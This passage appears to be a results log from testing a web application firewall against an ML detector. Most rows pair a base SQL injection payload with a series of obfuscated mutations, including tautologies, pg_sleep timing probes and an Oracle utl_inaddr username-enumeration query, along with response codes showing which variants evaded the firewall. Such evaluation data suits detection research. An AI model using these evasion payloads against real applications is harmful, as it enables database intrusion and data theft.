+(		__TIME__ /**/)  --",2025-10-25T13:29:12.393020,403,403,both_correct,"(SelECT/*L$*/(seLECT (SeLect (SelEct   AND  (sELEcT (SEleCt 'h?vP' not like 'h?vPK')) LikE 1717 NOT LIKE (SelEcT  or 0))))) not LIkE 0x132e || pg_sleep  (		__TIME__  )  --",2025-10-25T13:29:31.208795,403,403,both_correct,"(sEleCT/*	|5*/(SElect (sElECT (sElEct   And  (SeLeCt (SELECT 'h?vP' not like 'h?vPK')) LIKe  OR '.'='.' NOT LIKE (sELeCT  or 0x0))))) not LIkE 0x132e  oR  pg_sleep  (	 __TIME__  )/**/ --",2025-10-25T13:29:48.739242,403,403,both_correct,"(SelEct/*	|(SELECT ',' LIKE	',')*/(seLEct (SElect (SELECt   aNd  (seLect (seleCt 'h?vP' not like 'h?vPK')) LiKE  or '.' liKE '.' NOT LIKE (sELeCt  OR 0x0))))) not LIkE 0x132e  Or  pg_sleep  (	 __TIME__  )  --",2025-10-25T13:30:05.545227,403,403,both_correct,"(SELEcT/* |(SELECT ',' LIKE	',')*/(SElEcT (selECT (seLect   AnD  (SElect (SELEct 'h?vP' not like 'h?vPK')) lIkE  oR '.' liKe '.' NOT LIKE (seLECt  OR 0x0))))) not/*9[)o*/LIKe 0x132e  oR  pg_sleep  (	 __TIME__  )  --",2025-10-25T13:30:23.963052,403,403,both_correct,"(SELEcT/* |(SELECT ',' LIKE	',')*/(sELEcT (sElEcT (SELECT   anD  (SElEct (sEleCT 'h?vP' not like 'h?vPK')) likE /**/|| '.' liKe
+'.' NOT LIKE (seLEcT  Or 0x0))))) not/*'_0'<>'_0m'[)o*/liKE 0x132e  oR  pg_sleep  (	 __TIME__  )  --",2025-10-25T13:30:43.071502,403,403,both_correct,"(sEleCt/* |(SELECT ',' LIKE	',')*/(SELecT (sElEcT (sELect   And  (sELeCT (seLeCT 'h?vP' not like 'h?vPK')) lIke
+  OR  '.' LIke
+'.' NOT LIKE (seLecT  OR 0x0))))) not/*'_0'<>'_0m'[)o*/LikE 0x132e  oR  pg_sleep  (	 __TIME__  )  --",2025-10-25T13:31:00.279283,403,403,both_correct
+12,2025-10-25T13:31:17.699147,select * from users where id  =  1 <@ or 1  =  1 -- 1,403,403,403,both_correct,"seLECt * FrOM users WhERE id   LiKE    OR 0/**/<@ OR 0x1  = 	1 -- 'h Yas'<>'h Yasc'",2025-10-25T13:31:35.356035,403,403,both_correct,sELeCT * frOm users whERE id   lIke    oR 0 <@ Or 0x1   like    OR 0 LIKE 0x26fe -- 'h Yas'<>'h Yasc'yv,2025-10-25T13:31:54.075082,403,403,both_correct,"SElEct * froM users WHeRe id   LikE    or 'm'!='mm' <@/**{K*/or 0x1   lIkE    or 0x0 lIkE 0x26fe -- 'h	Yas'<>'h Yasc'yv",2025-10-25T13:32:11.715965,403,403,both_correct,sELeCT * FrOM users wheRE id   lIKe    OR/**/'m' NOT LIKE 'mm' <@/**{K*/oR 0x1   LIkE    Or 0x0 lIKe 0x26fe -- 'h Yas'<>'h Yasc'yvI(,2025-10-25T13:32:29.230803,403,403,both_correct,"SElect * FrOM users where id   LiKe   
+||/**/'m' NOT/**/LIKE 'mm' <@/**{K*/Or 0x1   lIkE    or 0x0 LiKE 0x26fe -- 'h Yas'<>'h Yasc'yvI(ff",2025-10-25T13:32:47.632922,403,403,both_correct,"SelEct * FrOM users wheRe id   lIkE   	||/**/'m' NOT/**/lIkE 'mm' <@/**{K*/oR 0x1   likE    oR 0x0 liKE/**/0x26fe -- 'h Yas'<>'h Yasc'yvI(ffm`",2025-10-25T13:33:04.779861,403,403,both_correct,"SelecT * FrOM users WhEre id   LIke   
+ or  'm' NOT/*`$rf*/LikE 'mm' <@/**{K*/oR 0x1   liKe    Or 0x0 lIKE/**/0x26fe -- 'h Yas'<>'h Yasc'yvI(ffm`",2025-10-25T13:33:22.681136,403,403,both_correct,sElECt * fROM users WhErE id   lIKe    /**/or  'm' NOT/*`$rf*/LIKe 'mm' <@/**{K*/oR 0x1   LikE    or 0x0 lIKE/**/0x26fe -- 'h Yas'<>'h Yasc'yvI(ffm`,2025-10-25T13:33:40.965138,403,403,both_correct,"selEcT * FRom users whEre id   liKE	   /**/or  'm' NOT/*`$rf*/lIKE 'mm' <@/**{K*/or 0x1   LIKe    || 0x0 liKE/**/0x26fe --/**/'h Yas'<>'h Yasc'yvI(ffm`i",2025-10-25T13:33:59.035371,403,403,both_correct,"sElECT * FRoM users Where id   liKe
+   /**/oR  'm' NOT/*`$rf*/liKe 'mm' <@/**{K*/Or 0x1   LIkE     OR  0x0 Like/**/0x26fe -- 'h Yas'<>'h Yasc'yvI(ffm`i*O",2025-10-25T13:34:16.951113,403,403,both_correct
+13,2025-10-25T13:34:35.007740,select * from users where id  =  1 %$ 1 or 1  =  1 -- 1,403,403,403,both_correct,"sElECT/**/*	froM users whEre id  =  1 %$  oR (SELECT 0) oR 1  =  'HPT""y'!='HPT""yn' -- 1",2025-10-25T13:34:53.408610,403,403,both_correct,"SElECT/*%Dn*/*	fROm users WHeRE id  =  1/**/%$  oR (SELECT (seLEcT (sElecT 1))) OR 8892<>8893  	lIke   'HPT""y'!='HPT""yn' -- 1",2025-10-25T13:35:13.330116,403,403,both_correct,"sEleCT/*%Dn*/*	FrOm users WHERE id  =  1/*F#*/%$  Or (seleCT (SELeCt (SEleCt (sELEcT/**/1)))) OR 8892!=(sELeCT 8893) 
+	LikE   'HPT""y'!='HPT""yn' -- 7260<>7261",2025-10-25T13:35:31.731708,403,403,both_correct,"seLecT/*%Dn*/*	fROM users wheRE id /**/=  1/*EW~*/%$  Or (SeLeCt (seLect (SElect (SelECT/**/'8e' NOT LIKE '8e.')))) OR 0x22bc!=(SeleCT 8893) 		like   'HPT""y'!='HPT""yn' --  OR 0<>7261",2025-10-25T13:35:50.222814,403,403,both_correct,"sElect/*%Dn*/*	FrOm users wHeRe
+id  =  (SELECT  OR 0)/*2%m0*/%$  OR (SeLect (SeleCT (SeLeCT (seLect/**/'8e' NOT LIKE '8e.')))) Or 0x22bc!=(SELECt '	0'<>'	0x') 		lIkE   'HPT""y' not like 'HPT""yn' --  OR 0<>7261",2025-10-25T13:36:09.575421,403,403,both_correct,"SELeCt/*%Dn*/*	FrOm
+users wHere
+id  =  (SElect  || 0)/**/%$  or (SeLeCt (SeLecT (sElECt (sELecT '8e' NOT LIKE '8e.')))) oR 0x22bc!=(sElecT '	'&'!='&y''<>'	0x') 		LIke   'HPT""y' not like 'HPT""yn' --  OR 0x0<>(SELECT 1){s",2025-10-25T13:36:27.891964,403,403,both_correct,"sElect/**/*	FRoM
+users where
+id   LIKE   (seLEct  || '
+' NOT LIKE '
+*') %$  oR	(SELect (sELeCT (selEct (Select '8e' NOT LIKE '8e.')))) OR 0x22bc!=(sELecT '	'&'!='&y''<>'	0x') 		lIkE   'HPT""y' not like 'HPT""yn' --  OR 0x0<>(SELECT 0x1){s~",2025-10-25T13:36:46.269031,403,403,both_correct,"seleCT/**/*	FroM
+users WHeRE id   LIke   (sELecT  || '
+' NOT LIKE '
+*') %$  Or	(selecT (selecT (sElect (SElECT '8e' not like '8e.')))) or 0x22bc!=(sEleCT '	'&'!='&y''<>'	0x') 		lIkE   'HPT""y' not like 'HPT""yn' --/**/ OR 0x0<>(SELECT 0x1){s~",2025-10-25T13:37:06.353958,403,403,both_correct,"SelecT/* 3*/*	frOM
+users wHERe id   Like   (sELEct  || ' ' NOT LIKE '
+*') %$  OR	(SeLeCT (SELecT (sElECt (sELeCt '8e' not like/**/'8e.')))) OR 0x22bc!=(sElEct '	'&'!='&y'' not like '	0x') 		lIKe   'HPT""y' not like 'HPT""yn' --/**/ OR 0x0<>(SELECT 0x1){s~",2025-10-25T13:37:24.556194,403,403,both_correct,"SeLeCT/*xc*/*	FROM
+users WhERe id   Like   (seLECT  || ' ' NOT LIKE '
+*') %$  Or	(select (SELeCT (select (SelEct '8e' not like '8e.')))) OR 0x22bc<>(sELECT '	'&'!='&y'' not like '
+0x') 		LiKe   'HPT""y' not like 'HPT""yn' --/**/ OR 0x0<>(SELECT 0x1){s~",2025-10-25T13:37:42.542346,403,403,both_correct
+14,2025-10-25T13:38:02.503160," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",403,403,403,both_correct," and (SELECT '|'<>'|D')   LIke   utl_inaddr.get_host_address   (    (   SeLECt
+DIsTinCT  (  USERNAME/**/ )   fRoM   (  selecT DiSTinCt  (  USERNAME  )  , ROWNUM AS LIMIT from SYS.ALL_USERS  )   WHERe LIMIT  =  (SELECT 6)   )    )    aND 'i'  =  'i",2025-10-25T13:38:20.426020,200,403,waf_incorrect_ml_correct," AND (sElect '|'<>'|D')   LiKE   utl_inaddr.get_host_address   (    (   sELEcT distiNct /**/(  USERNAME/*B_Yv*/ )   fROm   (  SeLect DiSTinct  (  USERNAME  )  , ROWNUM AS LIMIT fROM SYS.ALL_USERS  )   whERe LIMIT  =  (sELECT  or 7557!=0x1d86)   )    )    AnD 'i'   liKE   'i",2025-10-25T13:38:40.142287,200,403,waf_incorrect_ml_correct," AND (SElEcT '|'<>'|D')   like
+  utl_inaddr.get_host_address   (    (   sELect dIstiNCT  (  USERNAME/**/ )   fROm   (  seleCt DistINCT  (  USERNAME  )  , ROWNUM AS LIMIT FrOM SYS.ALL_USERS  )   wHerE LIMIT   Like   (sELeCt  Or (SELECt 2046 In (2045, AND 1,2047))!=0x1d86)   )    )    and 'i'   LIKE   'i",2025-10-25T13:38:58.970140,200,403,waf_incorrect_ml_correct," ANd (SElEcT '|'<>'|D')   LIKe   utl_inaddr.get_host_address   (    (   SElect distInct  (  USERNAME  )   FRom   (  SeleCT DIsTINcT  (  USERNAME  )  , ROWNUM As LIMIT froM SYS.ALL_USERS  )   wHEre LIMIT   lIkE   (sEleCt  OR (seLECT 2046 In (2045, And 7899 NOT LIKE  AND 1,(SElECT 2047)))!=0x1d86)   )    )    anD 'i'   liKE   'i",2025-10-25T13:39:17.947904,200,403,waf_incorrect_ml_correct," ANd (SeLecT '|'<>'|D')   LIke   utl_inaddr.get_host_address  /**/(
+   (   SELECt dIstiNcT  (  USERNAME  )   FROm   (  SelECt diStincT  (  USERNAME  )  , ROWNUM aS LIMIT FROm SYS.ALL_USERS  )   where LIMIT   lIKE   (seLect  or (sElECt 2046 IN (3146!=3147, And 7899 NOT LIKE  aNd (sEleCT 1),(sELECt (seLECT 2047))))!=0x1d86)   )    )    anD 'i'   liKE   'i",2025-10-25T13:39:36.370642,403,403,both_correct," aNd (sELeCT '|'<>'|D')   LIke   utl_inaddr.get_host_address   (	   (   SelEct DIStInCT  (  USERNAME  )   frOM   (  SeLeCT DIStINcT  (  USERNAME  )  , ROWNUM as LIMIT fROM SYS.ALL_USERS  )   WhERe LIMIT   lIKE   (seLEct  oR (SeLEcT 2046 iN ((SELECT 3146)!=3147, AnD 7899 NOT LIKE  And (SELecT 'F' LIKE 'F'),(SELect (sELecT (sELeCt 1)))))<>0x1d86)   )    )    AnD 'i'   liKE   'i",2025-10-25T13:39:54.435589,200,403,waf_incorrect_ml_correct," aNd (seLeCt '|'<>'|D')   lIKe   utl_inaddr.get_host_address   (	   (   SELeCt disTINct  (  USERNAME  )   fROM   (  SElECt distINCT  (  USERNAME  )  , ROWNUM As LIMIT fROm
+SYS.ALL_USERS  )   WHEre LIMIT   likE /**/ (sELeCt  OR (sElecT (seLecT 1) in ((sElECt 3146)!=3147, and (sEleCT 'm' LIKE 'm') not like  anD (SelEct 'F' lIKE 'F'),(sElECt (seLeCt (SeLEct 1)))))<>0x1d86)   )    )    aND 'i'   LiKe   'i",2025-10-25T13:40:13.626967,200,403,waf_incorrect_ml_correct," anD (sELecT '|'<>'|D')   liKE   utl_inaddr.get_host_address   (
+   (   SelECT distINCT  (  USERNAME  )  /**/fRom   (  SELECT DISTInCT  (  USERNAME  )  , ROWNUM aS LIMIT FROm
+SYS.ALL_USERS  )   WHEre LIMIT   liKE /*+*/ (sELecT  or (SeLecT (select 1) in ((SelEct ''<>'B')!=(SELeCt 3147), and (sELecT 'm' LIkE 'm') not like  aND (seLecT 'F' liKE 'F'),(SelECt (seLECT (Select  OR 0)))))<>0x1d86)   )    )    AND 'i'   LikE   'i",2025-10-25T13:40:32.076971,403,403,both_correct," aND (sElECt '|'<>'|D')   LIkE   utl_inaddr.get_host_address   (
+   (   seLeCt dIstiNCt  (  USERNAME  )   fROM   (  SeleCT distIncT  (  USERNAME  )  , ROWNUM AS LIMIT fROM
+SYS.ALL_USERS  )   WHERe LIMIT   LIkE /**/ (SelEct  or (seleCt (sELeCT (SEleCT 1)) in
+((SElecT ''<>'B')<>(SeLECT '+'<>'+9'), aND (SElEct 'm' liKe 'm') not like  aNd (sELECT 'F' LIkE 'F'),(seLEcT (sElecT (SeLECT  OR 0x0)))))<>0x1d86)   )    )    aND 'i'   lIkE   'i",2025-10-25T13:40:50.448110,403,403,both_correct," And (seLeCt '|' not like '|D')   LIKe   utl_inaddr.get_host_address /**/ (
+   (   seLecT DISTiNcT  (  USERNAME  )   fROm   (  SelEcT dIstINCT  (  USERNAME  )  , ROWNUM As LIMIT frOm
+SYS.ALL_USERS  )   WHERE LIMIT   liKe /*Ja*/ (SelecT  Or (seleCt (sELEct (SEleCT (SELECT 'Xz_' LIKE 'Xz_'))) In ((seLECt ''<>'B')<>(sElEcT '+'<>'+(SELECT 1)'), and (sELECT 'm' LikE 'm') not like  and (SELect 'F' LiKE 'F'),(sElECT (seLect (SElECt  or 0x0)))))<>0x1d86)   )    )    aNd 'i'   LIkE   'i",2025-10-25T13:41:09.178276,403,403,both_correct
+15,2025-10-25T13:41:27.559581," select * from users where id  =  1 or ""&  (  "" or 1  =  1 -- 1",403,403,403,both_correct," sElecT * frOM users wheRe id   like 	 0x1 Or/**/""&  (  "" Or 'W' NOT LIKE 'W8'  =   AND 1 -- 1",2025-10-25T13:41:45.143795,403,403,both_correct," selEcT * frOm users WHere id   LIKE   0x1 OR ""&  (  "" or 'W' NOT LIKE 'W8'  =   anD 0x1 -- '3Y'<>'3YA',",2025-10-25T13:42:04.480087,403,403,both_correct," SELeCt * FROm users wheRE id   LIkE   0x1 oR ""& 	(  ""/**/oR 'W' NOT LIKE 'W8'  =   And 0x1 -- '3Y'<>'3YA',vS",2025-10-25T13:42:23.605480,403,403,both_correct," seLECt * From users WHERe id   like   0x1 OR ""&  (  "" or 'W' NOT LIKE 'W8'  =   AND 0x1 -- '3Y'<>'3YA',vS|",2025-10-25T13:42:43.037843,403,403,both_correct," sElECt * fROM users wHerE id   liKe   0x1 OR ""&  (  "" or 'W' not like 'W8'  =	/**/ aNd 0x1 -- '3Y'<>'3YA',vS|Jq",2025-10-25T13:43:01.687616,403,403,both_correct," SElect * fRoM users whERe id   liKE   0x1 oR ""&  (/*p&*/ "" OR 'W' not like 'W8'  = /**/ AnD 0x1 -- '3Y'<>'3YA',vS|Jq",2025-10-25T13:43:20.249059,403,403,both_correct," seLECT * frOm users WHERe id   lIKe
+  0x1 OR ""&  (/*p&*/ "" OR 'W'/**/not like 'W8'   like  /**/ And 0x1 -- '3Y'<>'3YA',vS|JqNf",2025-10-25T13:43:38.232653,403,403,both_correct,"/**/sEleCT * FROM users WhERE id   lIKe   0x1 oR ""&  (/**/ "" or 'W'/**/not like 'W8'   LikE  /**/ anD 0x1 -- '3Y'<>'3YA',vS|JqNfS",2025-10-25T13:43:57.019126,403,403,both_correct,"/**/SeLECT * FrOM users wHere id   LIkE   0x1 or ""&  (/*B*/ "" or 'W'/**/not like 'W8'   lIkE    ANd 0x1
+-- '3Y'<>'3YA',vS|JqNfS",2025-10-25T13:44:15.418189,403,403,both_correct,"/**/sELECt * fROM users whERE id   LIke   0x1 or ""&  (  "" or 'W'/**/not like 'W8'   LikE    aNd 0x1 -- '3Y'<>'3YA',vS|JqNfS9",2025-10-25T13:44:33.382517,403,403,both_correct
+16,2025-10-25T13:44:52.112183, )   or   (  'a'  =  'a,403,200,200,both_incorrect," )   Or /*~o*/	(  'a'   like   'a",2025-10-25T13:45:09.390038,200,403,waf_incorrect_ml_correct," )  /**/or
+/*q
+(HV*/	(  'a'   liKe   'a",2025-10-25T13:45:28.321757,200,403,waf_incorrect_ml_correct," )/**/
+/**/OR
+/*q
+(HV*/	(  'a'   lIke   'a",2025-10-25T13:45:46.232132,200,403,waf_incorrect_ml_correct," )/**/
+/**/or
+/*q
+(HV*/	( /**/'a'   LIke
+  'a",2025-10-25T13:46:04.812681,200,403,waf_incorrect_ml_correct," )/**/
+/**/or
+/*q
+(HV*/ ( /**/'a'   LIkE
+ /**/'a",2025-10-25T13:46:23.034263,200,403,waf_incorrect_ml_correct," )/**/
+/**/oR
+/*q
+(HV*/	( /**/'a'   like
+/**//**/'a",2025-10-25T13:46:41.915555,200,403,waf_incorrect_ml_correct,"/**/)/**/
+/**/Or	/*q
+(HV*/	( /**/'a'   Like
+/**//**/'a",2025-10-25T13:47:07.961792,200,403,waf_incorrect_ml_correct,"/**/)/**/  or	/*q
+(HV*/	( /**/'a'   LIKe
+/**//**/'a",2025-10-25T13:47:23.658717,200,403,waf_incorrect_ml_correct,"/**/)/**//**/ or	/*q
+(HV*/	( /**/'a'   liKE	/**//*W&'*/'a",2025-10-25T13:47:42.021582,200,403,waf_incorrect_ml_correct,"/**/)/**//**/ Or	/*q
+(HV*/ ( /**/'a'   LiKe	 /*W&'*/'a",2025-10-25T13:47:59.737530,200,403,waf_incorrect_ml_correct
+17,2025-10-25T13:48:18.257142," select * from users where id  =  1 or ""%{"" or 1  =  1 -- 1",403,403,403,both_correct," selECT * FROm users wHERe id  =  (sEleCt 1) OR ""%{""/**/OR (sELeCt 1) 
+ LIke   1 -- '#r}T8'!='#r}T8W'",2025-10-25T13:48:35.772742,403,403,both_correct," seLecT * FrOm users WHERE/**/id  =  (sELeCt 'nc	' LIKE 'nc ') Or ""%{""/*%C L*/or (SElECT (SELECT 1)) 
+ liKe   0x1 -- '#r}T8'!='#r}T8W'",2025-10-25T13:48:54.605323,403,403,both_correct," selEcT * FROm users WhErE id   like   (SELEcT 'nc	' LIke 'nc ') OR ""%{""/*e)W*/or (seLEcT (SeLECT (selECT  AND 1241!=1242))) 	 like   0x1 -- '#r}T8'!='#r}T8W'",2025-10-25T13:49:12.358776,403,403,both_correct," sElECT * FROM users wheRE id/**/  liKe   (sELEct 'nc
+' lIkE 'nc ') OR ""%{""/*e)W*/Or (seLeCT (SeLect (sELEct  and  OR 'gu'!='gu{' NOT LIKE 0x4da))) 	 likE   0x1 -- '#r}T8'!='#r}T8W'",2025-10-25T13:49:30.838232,403,403,both_correct," seLeCT * From
+users WhERe id   like   (sElECt 'nc
+' likE 'nc ') || ""%{""/*e)W*/oR (SeLeCt (seleCt (sElect  ANd  oR 'gu'!='gu{' NOT LIKE 0x4da))) 	 lIKe   0x1 -- '#r}T8'!='#r}T8W'8Y",2025-10-25T13:49:49.445234,403,403,both_correct," SELecT * FROM
+users WHerE id  /*D1	r*/LiKE   (sELeCt 'nc
+' like 'nc ')  Or  ""%{""/*e)W*/OR (seLecT (sElecT (selecT  AND
+ Or 'gu'!='gu{' NOT LIKE 0x4da))) 	 LIkE   0x1 -- '#r}T8'!='#r}T8W'8Y",2025-10-25T13:50:07.781948,403,403,both_correct," SeLEct * FrOm
+users wHERE id  /**/liKE   (SELEct 'nc
+' LiKE 'nc ')/**/ Or  ""%{""/*e)W*/|| (SELEct (seLECT (SeLEcT  ANd
+ Or 'gu'!='gu{' NOT LIKE 0x4da))) 	 LIKE   0x1 -- '#r}T8'!='#r}T8W'8Y$'",2025-10-25T13:50:27.013208,403,403,both_correct," seLEct * FROM
+users wheRE id  /**/LIKE   (SEleCT 'nc
+' LIKe 'nc ')  OR  ""%{""/*e)W*/|| (SELEcT
+(sELECT (SeLect  aNd
+ or 'gu' not like 'gu{' NOT LIKE 0x4da))) 	 liKE   0x1 -- '#r}T8'!='#r}T8W'8Y$'k",2025-10-25T13:50:45.569201,403,403,both_correct," selECT * From
+users where id  /**/liKe   (seLect 'nc ' lIKe 'nc ') /**/oR  ""%{""/*e)W*/|| (SELecT
+(seleCt (sELeCT  AnD
+ Or 'gu' not like 'gu{' not like 0x4da))) 	 like   0x1 -- '#r}T8'!='#r}T8W'8Y$'kH",2025-10-25T13:51:03.825498,403,403,both_correct," SELeCT * FrOm
+users whErE id  /**/LiKE   (selEcT 'nc ' LIke 'nc ')  Or  ""%{""/*e)W*/ OR  (sELEct
+(seLeCT (sELEcT  aNd
+ OR 'gu' not like 'gu{' not like 0x4da))) 	 lIKE	  0x1 -- '#r}T8'!='#r}T8W'8Y$'kHG,",2025-10-25T13:51:22.010371,403,403,both_correct
+18,2025-10-25T13:51:40.802875, or 3  =  3 --,403,200,403,waf_incorrect_ml_correct," OR  AND 'IU}' LIKE 'IU}'  /**/like	  3 --",2025-10-25T13:51:58.653426,200,403,waf_incorrect_ml_correct," or  AnD 'IU}' LIkE 'IU}' 	 lIKE	  (SElecT 0x1) --",2025-10-25T13:52:19.576902,200,200,both_incorrect," OR  AND/**/'IU}' LIKE 'IU}' 	 LIke
+  (SeLecT 0x1) --",2025-10-25T13:52:39.728137,403,403,both_correct," or  aND 'IU}' lIKe 'IU}' 
+ LIKe
+  (selEcT 0x1) --",2025-10-25T13:52:58.178427,403,200,waf_correct_ml_incorrect," oR  and
+'IU}' lIke 'IU}' 
+/**/LIke
+  (SELect 0x1) --",2025-10-25T13:53:16.235904,403,403,both_correct," or/**/ and
+'IU}' LIKe 'IU}' 
+/*R*/lIkE   (sElECT 0x1) --",2025-10-25T13:53:35.134016,200,403,waf_incorrect_ml_correct," OR/**/ AnD	'IU}' lIKE 'IU}' 
+/*n*/LiKe  /**/(selEct 0x1) --",2025-10-25T13:53:53.723344,200,403,waf_incorrect_ml_correct," oR  and 'IU}' Like 'IU}' 
+/*n*/LiKE  /**/(SElecT 0x1) --",2025-10-25T13:54:12.089158,200,403,waf_incorrect_ml_correct," or  anD 'IU}' Like 'IU}' 
+/**/LiKe
+  (seLeCT 0x1) --",2025-10-25T13:54:31.407181,403,403,both_correct," OR  and 'IU}' lIke 'IU}' 
+ likE
+  (seLect 0x1)	--",2025-10-25T13:54:49.948833,403,200,waf_correct_ml_incorrect
+19,2025-10-25T13:55:09.055868,%27 or 1  =  1,403,403,403,both_correct,"%(SElECT 27) Or	(SElect 8583!=8584)   lIKE/**/  1",2025-10-25T13:55:26.414009,403,403,both_correct,%(SeLecT  Or 0) Or (seleCt 3837 NOT LIKE 3838<>8584)   lIkE   (SELECt 1),2025-10-25T13:55:45.787096,403,200,waf_correct_ml_incorrect,"%(SELEct  oR '~''!='~'4') or (sEleCT 3837 NOT LIKE (SElect/*L*/1)!=8584)  
+liKe   (SELEct (SELECT 1))",2025-10-25T13:56:05.848246,403,403,both_correct,"%(SelECT  OR '~''!='~' AND 1') oR (SELECt 1566 lIKe 1566 not like (SELECT/*Z*/0x1)!=8584)  	liKE /**/ (SeLecT (SElEcT 1))",2025-10-25T13:56:23.976705,403,403,both_correct,"%(sElECT /**/oR '~''!='~'
+AND 1') or (selECT 'h'='h' LIke 1566 not like (SELEcT/**/0x1) not like (sEleCt 8584))  	LIKe /**/ (sElECt (SElecT  Or 0))",2025-10-25T13:56:42.532933,403,403,both_correct,"%(SElEcT /**/OR '~''!='~' AND 1') oR (sElECt 'h' liKE 'h' LIke 'L	'='L	'/**/not like (SEleCt/**/0x1) not like (SeLECT 0x2188))  	LiKE /**/ (select (SeLect  OR (SELECT 1)))",2025-10-25T13:57:00.617762,403,403,both_correct,"%(SELECT /**/oR '~''!='~' AND '='<>'=v'') oR (sElEct 'h' LIKE	'h' LIkE 'L	'='L	'/**/not like (SElECt/*
+5:GR*/0x1) not like (seLEcT 0x2188))  	likE /**/ (SelEcT (SelECt  Or (SELECt  AND/**/0x1)))",2025-10-25T13:57:19.286629,403,403,both_correct,"%(SElEcT /**/oR '~''!='~' AND '='<>'=v'') || (SELEcT 8137 in (8136,(SELECT 1),8138) lIke 'L	'='L	'/**/not	like (sElEct/*
+0x5:GR*/0x1) not like (sELecT 0x2188))  	like   (sELect (selECT  or (sELeCT  aND/**/0x1)))",2025-10-25T13:57:37.676467,403,403,both_correct,"%(SeLeCT /* */Or '~''!='~' AND ' liKe '<>'=v'') || (select 'V'='V' in (0x1fc8,(SELECt 1), and 1) lIKe 'L
+'='L	' not	like (SeleCt/*
+0x5:GR*/0x1) not like (sELEct 0x2188))  	lIKe   (SElECt (SElECt  Or (SeLect  anD/**/0x1)))",2025-10-25T13:57:57.219529,403,403,both_correct,"%(SElecT /* */oR '~''!='~' AND ' LikE '<>'=v'')/**/|| (selECt 'V'='V' in (0x1fc8,(Select (SELECT 1)), anD  AND '1B' NOT LIKE '1BJ') LiKE 'L
+' like 'L	' not	like (SEleCT/**/0x1) not like (SELECT 0x2188))  	Like   (SeLEct (seLEcT  OR (SElEct	 and/**/0x1)))",2025-10-25T13:58:15.656096,403,403,both_correct
+20,2025-10-25T13:58:34.070421," select * from users where id  =  1 or ""$["" or 1  =  1 -- 1",403,403,403,both_correct," sELEcT
+* fROM users WherE id  =  (SElECT 0x1) or ""$["" Or 'k""~kr'<>'k""~krL' /**/=  1 -- 1",2025-10-25T13:58:51.602622,403,403,both_correct," SelecT
+* fROM users whERE/**/id  =  (selecT 0x1) OR ""$["" or 'k""~kr'!='k""~krL' /**/= 	(selECt 1) --  OR 'D' NOT LIKE 'Dj'",2025-10-25T13:59:10.836627,403,403,both_correct," Select
+* frOM users wHERe/**/id  =  (SeLeCt 0x1) Or ""$["" or 'k""~kr' not like 'k""~krL'  =  (SEleCt 0xc43!= OR 0) --  OR 'D' NOT LIKE 'Dj'K",2025-10-25T13:59:31.209459,403,403,both_correct," SelEct	* frOm users Where id  =  (SeleCt 0x1) Or ""$["" Or 'k""~kr' not like 'k""~krL'  =  (sEleCT 0xc43 not like  OR 'o'<>'o?') --  OR 'D' NOT LIKE 'Dj'K",2025-10-25T13:59:49.991648,403,403,both_correct," sElecT	* froM users WHerE id   liKe /*Rz*/ (SeLECt 0x1) Or ""$["" OR 'k""~kr' not like 'k""~krL'  =	 (SELeCT 0xc43 not like  oR 'o'<>'o?') --  OR 'D' NOT LIKE 'Dj'K",2025-10-25T14:00:08.410356,403,403,both_correct," SELeCt	* fROm users/**/WHEre id   lIke /*a1Ze*/ (SElECt 0x1) Or ""$["" Or 'k""~kr'
+not like 'k""~krL'  =	 (SelEct 0xc43 not like  Or 'o' not like 'o?') --  OR 'D' NOT LIKE 'Dj'K",2025-10-25T14:00:27.152314,403,403,both_correct," SeLECt	* FRoM users/**/wHeRE id   lIKE   (seLecT 0x1) oR ""$["" Or 'k""~kr'
+not like 'k""~krL'   LIke 	 (sElEcT 0xc43 not like  oR 'o' not like	'o?') --  OR 'D' NOT LIKE 'Dj'Ke",2025-10-25T14:00:46.233098,403,403,both_correct," SELecT	* fROM users WHere id   LikE   (SeLeCt 0x1) oR ""$["" or 'k""~kr'
+not like 'k""~krL'   Like 	 (SELEcT 0xc43 not like  or 'o' not like	'o?') --	 OR 'D' NOT LIKE 'Dj'KeL",2025-10-25T14:01:03.790218,403,403,both_correct," sELeCt	* From users WHere id   like   (SELEct 0x1) OR ""$[""/**/OR 'k""~kr'
+not like 'k""~krL' 
+ LIke 	 (sELecT 0xc43 not like  oR 'o' not like	'o?') --	 OR 'D' NOT LIKE 'Dj'KeL",2025-10-25T14:01:23.228192,403,403,both_correct," sElecT * FrOm users WheRE id   lIkE   (seLECT 0x1) OR ""$["" oR 'k""~kr'
+not like 'k""~krL' 
+ LIKe 	 (sELEcT 0xc43 not like  or 'o' not like	'o?') --	 OR 'D' NOT LIKE 'Dj'KeL",2025-10-25T14:01:41.673567,403,403,both_correct
+21,2025-10-25T14:02:00.283059," select * from users where id  =  1 or ""?  (  "" or 1  =  1 -- 1",403,403,403,both_correct," SELEcT * fRoM users WheRE id  
+LiKe   (SELECT 1) OR ""?/**/ (  "" or  or 0  =  1 -- 676!=677E>",2025-10-25T14:02:17.294550,403,403,both_correct," SElECT * fROm users WHerE id   lIKE   (SELeCt (selEct 1)) || ""?  (  "" OR  OR  oR 0  =  1 -- '''!=''M'!=677E>=",2025-10-25T14:02:36.581308,403,403,both_correct," sElect */**/frOm users WHEre id   lIKE	  (SElect (selecT 1)) || ""?  (  "" or  OR  or (SeleCt 6660) not like 6661  =  (selECT 1) -- '''!=''M'!=677E>=w",2025-10-25T14:02:55.587010,403,403,both_correct," seleCT * From users WHeRe id   LiKe
+  (SeLecT (SElECT  AND 1))  OR  ""?  (  "" OR  oR  or (sEleCT 6660) not like (SElECt '%/n5' LIKE '%/n5')  =  (seLecT 1) -- '''!=''M'!=677E>=w6/",2025-10-25T14:03:15.293733,403,403,both_correct," SELEcT * fRom users WHERe id   LIKe	  (select (sELEcT  And 'ry'<>'ryj'))  oR  ""? /*`k,*/(  "" oR  ||  or (SELecT (SELECT 0x1)) not like (seLECT '%/n5' LIkE '%/n5')  =  (seleCT 1) -- '''!=''M'!=677E>=w6/",2025-10-25T14:03:33.519419,403,403,both_correct," seLecT * fRom users wHeRE id   LIKe	  (sELECT (SELEcT  AND 'ry'!='ryj'))  Or  ""?  (  "" Or  ||  Or (seLect (selEct 0x1)) not like (seLEcT '%/n5' lIkE '%/n5')
+ =  (seLecT (selEct 6057)<> ANd 1) -- '''!=''M'!=677E>=w6/e1",2025-10-25T14:03:53.264369,403,403,both_correct," seleCt * from users whERE id   likE
